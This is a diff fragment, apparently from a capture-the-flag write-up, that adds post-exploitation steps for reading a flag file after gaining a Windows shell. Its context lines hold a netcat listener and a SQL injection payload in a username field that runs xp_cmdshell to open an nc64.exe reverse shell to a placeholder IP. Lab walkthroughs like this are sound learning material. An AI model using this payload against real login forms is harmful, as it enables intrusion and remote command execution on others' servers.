@@ -32,4 +32,8 @@ nc -lvnp 8443
 UsernameTextBox=1';EXEC xp_cmdshell "C:/Windows/Temp/nc64.exe <ip> 8443 -e cmd.exe";--
 
 Then successful intrude into the Windows system and flag is located at C:/inetpub/wwwroot
-
+whoami
+pwd
+cd C:
+cd inetpub/wwwroot
+type flag.txt
